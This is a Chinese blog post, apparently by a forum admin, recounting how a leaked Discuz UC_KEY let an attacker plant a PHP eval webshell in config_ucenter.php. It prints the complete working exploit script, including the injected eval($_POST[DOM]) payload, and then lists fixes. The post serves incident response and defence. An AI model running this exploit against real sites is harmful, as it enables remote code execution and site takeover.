---
title: 140212 Discuz UC_KEY泄露导致获得WebShell
author: 张 清月
layout: post
permalink: /2735.html
views:
  - 13
categories:
  - Code
tags:
  - discuz
  - uc_key
  - webshell
---
吃饭的时候同事发了个微信给我，说社区头像都显示不了了，当时没太在意，估计是cdn的问题。回来后打开网站自己看了下，乖乖把我吓坏了竟然出现了这么个情况。

所有头像地址都变为：

<pre class="brush: php; title: ; notranslate" title="">http://xxx\');eval($_POST[DOM]);//avastar.php?uid=123&#038;size=middle

</pre>

一看就知道是被人黑了，估计还拿到了webshell.

果断看了下代码做了断点调试，确实是ucenterurl中的值被更改了

<pre class="brush: php; title: ; notranslate" title="">function avatar($uid, $size = 'middle', $returnsrc = FALSE, $real = FALSE, $static = FALSE, $ucenterurl = '') {
	global $_G;
	if($_G['setting']['plugins']['func'][HOOKTYPE]['avatar']) {
		$_G['hookavatar'] = '';
		$param = func_get_args();
		hookscript('avatar', 'global', 'funcs', array('param' =&gt; $param), 'avatar');
		if($_G['hookavatar']) {
			return $_G['hookavatar'];
		}
	}
	static $staticavatar;
	if($staticavatar === null) {
		$staticavatar = $_G['setting']['avatarmethod'];
	}

	$ucenterurl = empty($ucenterurl) ? $_G['setting']['ucenterurl'] : $ucenterurl;
	$size = in_array($size, array('big', 'middle', 'small')) ? $size : 'middle';
	$uid = abs(intval($uid));
	if(!$staticavatar && !$static) {
		return $returnsrc ? $ucenterurl.'/avatar.php?uid='.$uid.'&size='.$size : '&lt;img src="'.$ucenterurl.'/avatar.php?uid='.$uid.'&size='.$size.($real ? '&type=real' : '').'" /&gt;';
	} else {
		$uid = sprintf("%09d", $uid);
		$dir1 = substr($uid, 0, 3);
		$dir2 = substr($uid, 3, 2);
		$dir3 = substr($uid, 5, 2);
		$file = $ucenterurl.'/data/avatar/'.$dir1.'/'.$dir2.'/'.$dir3.'/'.substr($uid, -2).($real ? '_real' : '').'_avatar_'.$size.'.jpg';
		return $returnsrc ? $file : '&lt;img src="'.$file.'" onerror="this.onerror=null;this.src=\''.$ucenterurl.'/images/noavatar_'.$size.'.gif\'" /&gt;';
	}
}
</pre>

在config/config\_ucenter.php 中的 UC\_API 的值变成了一句话木马。根据字符特征，很快找到了exp

<pre class="brush: php; title: ; notranslate" title="">&lt;?php
    $timestamp = time()+10*3600;
    $host="127.0.0.1";
    $uc_key="eapf15K8b334Bc8eBeY4Gfn1VbqeA0N5Waofq6J285Ca33i151e551g0l9f2l3dd";
    $code=urlencode(_authcode("time=$timestamp&action=updateapps", 'ENCODE', $uc_key));
    $cmd1='&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
&lt;root&gt;
 &lt;item id="UC_API"&gt;http://xxx\');eval($_POST[DOM]);//&lt;/item&gt;
&lt;/root&gt;';
    $cmd2='&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
&lt;root&gt;
 &lt;item id="UC_API"&gt;http://aaa&lt;/item&gt;
&lt;/root&gt;';
    $html1 = send($cmd1);
    echo $html1;
    $html2 = send($cmd2);
    echo $html2;
    
    
function send($cmd){
    global $host,$code;
    $message = "POST /api/uc.php?code=".$code."  HTTP/1.1\r\n";
    $message .= "Accept: */*\r\n";
    $message .= "Referer: ".$host."\r\n";
    $message .= "Accept-Language: zh-cn\r\n";
    $message .= "Content-Type: application/x-www-form-urlencoded\r\n";
    $message .= "User-Agent: Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.1; SV1)\r\n";
    $message .= "Host: ".$host."\r\n";
    $message .= "Content-Length: ".strlen($cmd)."\r\n";
    $message .= "Connection: Close\r\n\r\n";
    $message .= $cmd;
	
	//var_dump($message);
    $fp = fsockopen($host, 80);
    fputs($fp, $message);
    
    $resp = '';

    while ($fp && !feof($fp))
        $resp .= fread($fp, 1024);
    
    return $resp;
}

function _authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
    $ckey_length = 4;

    $key = md5($key ? $key : UC_KEY);
    $keya = md5(substr($key, 0, 16));
    $keyb = md5(substr($key, 16, 16));
    $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';

    $cryptkey = $keya.md5($keya.$keyc);
    $key_length = strlen($cryptkey);

    $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
    $string_length = strlen($string);

    $result = '';
    $box = range(0, 255);

    $rndkey = array();
    for($i = 0; $i &lt;= 255; $i++) {
        $rndkey[$i] = ord($cryptkey[$i % $key_length]);
    }

    for($j = $i = 0; $i &lt; 256; $i++) {
        $j = ($j + $box[$i] + $rndkey[$i]) % 256;
        $tmp = $box[$i];
        $box[$i] = $box[$j];
        $box[$j] = $tmp;
    }

    for($a = $j = $i = 0; $i &lt; $string_length; $i++) {
        $a = ($a + 1) % 256;
        $j = ($j + $box[$a]) % 256;
        $tmp = $box[$a];
        $box[$a] = $box[$j];
        $box[$j] = $tmp;
        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
    }

    if($operation == 'DECODE') {
        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
            return substr($result, 26);
        } else {
                return '';
            }
    } else {
        return $keyc.str_replace('=', '', base64_encode($result));
    }

}
?&gt;
</pre>

网上没有相关的对策不过oldjun说得很对这玩意漏洞必须满足2个条件：

<pre>1.必须知道UC_KEY，通常在配置文件里，或者ucenter的原始（没有经过修改的）数据库（应用）中；

2.配置文件config_ucenter.php必须可写。
</pre>

**说白了是因为在做cdn源的时候比较粗肢的把php源代码包含了一部分出去，所以hacker可以根据相对路径获取到uc_key的内容。**

关于如何解决:  
1：修改 config_ucenter.php 权限为不可写  
2：修改 api/uc.php 中 代码，把之注释掉  
3: 更改 uc\_key ，并且保证config\_ucenter.php中的与uc_server/data/cache/apps.php中的一致

<pre class="brush: php; title: ; notranslate" title="">if ($UC_API && is_writeable ( DISCUZ_ROOT . './config/config_ucenter.php' )) {
			if (preg_match ( '/^https?:\/\//is', $UC_API )) {
				$configfile = trim ( file_get_contents ( DISCUZ_ROOT . './config/config_ucenter.php' ) );
				$configfile = substr ( $configfile, - 2 ) == '?&gt;' ? substr ( $configfile, 0, - 2 ) : $configfile;
				$configfile = preg_replace ( "/define\('UC_API',\s*'.*?'\);/i", "define('UC_API', '" . addslashes ( $UC_API ) . "');", $configfile );
				if ($fp = @fopen ( DISCUZ_ROOT . './config/config_ucenter.php', 'w' )) {
					//@fwrite ( $fp, trim ( $configfile ) );
					@fclose ( $fp );
				}
			}
		}
</pre>

本文参考:

http://www.oldjun.com/blog/index.php/archives/76/

http://www.unhonker.com/bug/1509.html